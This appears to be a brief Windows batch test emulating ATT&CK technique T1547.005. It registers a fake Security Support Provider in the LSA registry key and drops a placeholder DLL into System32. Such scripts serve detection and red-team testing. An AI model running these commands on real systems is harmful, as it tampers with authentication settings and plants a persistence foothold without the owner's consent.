@echo off
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v "Security Packages" /t REG_MULTI_SZ /d T1547005001 /f
echo "EVIL" >> C:\Windows\System32\T1547005001.dll